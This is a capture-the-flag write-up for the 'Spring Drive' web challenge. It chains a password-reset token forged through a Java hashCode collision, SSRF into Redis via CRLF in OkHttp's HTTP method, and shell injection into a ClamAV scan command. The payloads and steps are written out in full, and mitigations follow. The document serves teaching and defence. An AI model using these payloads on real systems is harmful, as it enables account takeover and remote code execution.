# Spring Drive CTF Challenge - Analysis & Writeup

## Challenge Info
- **Name**: Spring Drive
- **Category**: Web
- **Flag**: `Hero{8be9845ab07c17c7f0c503feb0d91184}`

## Summary

This challenge requires chaining multiple vulnerabilities to achieve RCE on a Java Spring Boot application:

1. **Password Reset Token Forgery** - Weak token comparison using hashCode collision
2. **Admin Account Takeover** - Reset admin password with forged token
3. **SSRF via Remote Upload** - OkHttp allows custom HTTP methods without validation
4. **Redis Command Injection** - HTTP method injection to execute Redis RPUSH
5. **Command Injection in ClamAV** - Shell injection via unsanitized filepath

## Vulnerability Details

### 1. Password Reset Token Forgery

**File**: `backend/src/main/java/com/challenge/drive/model/ResetPasswordToken.java`

```java
@Override
public boolean equals(Object o) {
    return this.token.split("\\|")[0].equals(((ResetPasswordToken) o).token.split("\\|")[0]) 
           && this.hashCode() == o.hashCode();
}

@Override
public int hashCode() {
    return token.hashCode() + email.hashCode();
}
```

**Vulnerability**: The `equals()` method only compares:
1. The UUID prefix of the token (before `|`)
2. The hashCode (which is `token.hashCode() + email.hashCode()`)

**Token Format**: `UUID|userId`

**Exploit**: 
- When we change `|userId` to `|1`, the token hash changes by `-(userId - 1)` due to Java's String.hashCode() algorithm
- We can compensate by registering with an email that has: `email.hash = admin@example.com.hash - (userId - 1)`
- Example: For userId=2, use `admin@example.col` which has the exact hash collision

**Java String.hashCode() Implementation**:
```python
def java_string_hash(s):
    h = 0
    for c in s:
        h = (31 * h + ord(c)) & 0xFFFFFFFF
    if h >= 0x80000000:
        h -= 0x100000000
    return h
```

### 2. SSRF via Remote Upload with HTTP Method Injection

**File**: `backend/src/main/java/com/challenge/drive/controller/FileController.java`

```java
@PostMapping("/remote-upload")
public JSendDto remoteUploadFile(...) {
    // ...
    String method = remoteUploadDto.httpMethod();
    String remoteUrl = remoteUploadDto.url();
    
    OkHttpClient client = new OkHttpClient();
    Request request = new Request.Builder()
            .url(remoteUrl)
            .method(method, null)  // User-controlled method!
            .build();
    // ...
}
```

**Vulnerability**: OkHttp 4.12.0 does NOT validate control characters (including `\r\n`) in HTTP method names.

**Exploit**: Set `httpMethod` to a Redis command like `RPUSH clamav_queue "payload"\r\n`

When OkHttp sends the request to `http://127.0.0.1:6379/x`:
```
RPUSH clamav_queue "payload"\r\n /x HTTP/1.1\r\n
Host: 127.0.0.1:6379\r\n
Connection: Keep-Alive\r\n
...
```

The `\r\n` after our payload terminates the Redis command cleanly. Redis processes:
1. `RPUSH clamav_queue "payload"` - **EXECUTES SUCCESSFULLY**
2. ` /x HTTP/1.1` - Unknown command, ignored
3. `Host: 127.0.0.1:6379` - Triggers Cross Protocol Scripting protection, connection aborted

**Key Insight**: Redis 7.0+ has protection against HTTP-based attacks, but it aborts the connection **after** processing valid commands that appear before `Host:`.

### 3. Command Injection in ClamAV Service

**File**: `backend/src/main/java/com/challenge/drive/service/ClamAVService.java`

```java
@Scheduled(fixedRate = 60 * 1000)
public void scanAllFiles() {
    while (!this.isEmpty()) {
        String filePath = this.dequeue();  // From Redis queue
        if (!this.isFileClean(filePath)) {
            // ...
        }
    }
}

public boolean isFileClean(String filePath) {
    String command = String.format("clamscan --quiet '%s'", filePath);
    ProcessBuilder processBuilder = new ProcessBuilder("/bin/sh", "-c", command);
    // ...
}
```

**Vulnerability**: The `filePath` from Redis is directly interpolated into a shell command with only single quotes as protection.

**Exploit Payload**: `'; cat /app/flag*.txt > /usr/share/nginx/html/flag.txt #`

Results in:
```bash
clamscan --quiet ''; cat /app/flag*.txt > /usr/share/nginx/html/flag.txt #'
```

## Complete Exploit Chain

1. **Predict next user ID** by checking `/api/auth/email` for existing reset tokens
2. **Calculate hash collision email** using Java String.hashCode() formula
3. **Register** with the collision email
4. **Request password reset** for our email
5. **Forge token** by changing `|userId` to `|1`
6. **Reset admin password** using forged token
7. **Login as admin** (userId=1 required for remote-upload endpoint)
8. **SSRF to Redis** with HTTP method = `RPUSH clamav_queue "'; COMMAND #"\r\n`
9. **Wait 60 seconds** for ClamAV cron job
10. **Retrieve output** from web root

## Flag Location

The flag was stored in two places:
- **Environment variable**: `FLAG=Hero{8be9845ab07c17c7f0c503feb0d91184}`
- **File**: `/app/flag_297ef3474fcecade.txt`

## Files Structure

```
spring-drive/
├── dist/
│   ├── backend/src/main/java/com/challenge/drive/
│   │   ├── controller/
│   │   │   ├── AuthController.java
│   │   │   ├── FileController.java      # SSRF vulnerability
│   │   │   └── UserController.java
│   │   ├── model/
│   │   │   └── ResetPasswordToken.java  # Token forgery vulnerability
│   │   └── service/
│   │       └── ClamAVService.java       # Command injection vulnerability
│   ├── conf/
│   │   └── nginx.conf
│   ├── build.gradle                      # OkHttp 4.12.0
│   └── Dockerfile
├── solve.py
└── analysis.md
```

## Key Technical Notes

### Redis Cross Protocol Scripting Protection

Redis 7.0+ detects HTTP requests and aborts connections when it sees `POST` or `Host:` commands. However:
- Commands sent BEFORE `Host:` are still executed
- Using CRLF (`\r\n`) to terminate our command ensures it's processed as a complete Redis command

### OkHttp HTTP Request Format

```
METHOD PATH HTTP/1.1\r\n
Host: hostname\r\n
Connection: Keep-Alive\r\n
Accept-Encoding: gzip\r\n
User-Agent: okhttp/4.12.0\r\n
\r\n
```

### Why /flag* Didn't Work Initially

The flag file had a random suffix: `flag_297ef3474fcecade.txt`. The glob `/flag*` in the root directory didn't match because the flag was in `/app/`. Using `/app/flag*.txt` or checking the `FLAG` environment variable worked.

## Mitigation Recommendations

1. **Token Comparison**: Use constant-time comparison and cryptographically secure token generation
2. **HTTP Method Validation**: Whitelist allowed HTTP methods, reject control characters
3. **SSRF Protection**: Block internal IP ranges, use allowlists for remote URLs
4. **Command Injection**: Never interpolate user input into shell commands; use parameterized execution
5. **Redis Security**: Use authentication, bind to localhost only, use Unix sockets
